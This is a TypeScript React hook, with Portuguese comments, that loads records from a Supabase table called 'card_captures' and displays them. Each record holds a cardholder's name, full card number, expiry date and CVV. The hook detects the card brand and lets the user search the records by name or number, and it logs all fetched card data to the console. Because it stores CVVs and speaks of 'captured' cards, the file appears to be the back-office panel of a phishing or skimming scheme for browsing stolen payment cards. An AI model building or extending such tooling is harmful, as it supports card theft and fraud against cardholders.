
import { useState, useEffect } from "react";
import { supabase } from "@/lib/supabase";
import { toast } from "sonner";

// Card capture type
export interface CapturedCard {
  id: number;
  nome_cliente: string;
  numero_cartao: string;
  validade: string;
  cvv: string;
  criado_em: string;
  bandeira: string;
}

// Função para determinar a bandeira do cartão com base no número
const detectCardBrand = (cardNumber: string): string => {
  const cleanedNumber = cardNumber.replace(/\s+/g, '');
  
  if (/^4/.test(cleanedNumber)) return "visa";
  if (/^5[1-5]/.test(cleanedNumber)) return "mastercard";
  if (/^3[47]/.test(cleanedNumber)) return "amex";
  if (/^6(?:011|5)/.test(cleanedNumber)) return "discover";
  if (/^(?:2131|1800|35)/.test(cleanedNumber)) return "jcb";
  if (/^3(?:0[0-5]|[68])/.test(cleanedNumber)) return "diners";
  
  return "desconhecida";
};

export const useCardCapture = () => {
  const [searchTerm, setSearchTerm] = useState("");
  const [capturedCards, setCapturedCards] = useState<CapturedCard[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const fetchCards = async () => {
      try {
        setIsLoading(true);
        console.log("Fetching card captures...");
        
        const { data, error } = await supabase
          .from("card_captures")
          .select("*")
          .order("criado_em", { ascending: false });
        
        if (error) {
          console.error("Erro ao buscar cartões:", error);
          toast.error("Não foi possível carregar os dados de cartões.");
          return;
        }
        
        console.log("Card captures fetched:", data);
        
        // Adicionar a bandeira do cartão com base no número
        const cardsWithBrand = data.map(card => ({
          ...card,
          bandeira: detectCardBrand(card.numero_cartao)
        }));
        
        setCapturedCards(cardsWithBrand);
      } catch (error) {
        console.error("Erro ao buscar cartões:", error);
        toast.error("Não foi possível carregar os dados de cartões.");
      } finally {
        setIsLoading(false);
      }
    };

    fetchCards();
  }, []);

  const filteredCards = capturedCards.filter(card => 
    card.nome_cliente.toLowerCase().includes(searchTerm.toLowerCase()) ||
    card.numero_cartao.includes(searchTerm)
  );

  return {
    capturedCards,
    setCapturedCards,
    searchTerm,
    setSearchTerm,
    filteredCards,
    isLoading
  };
};
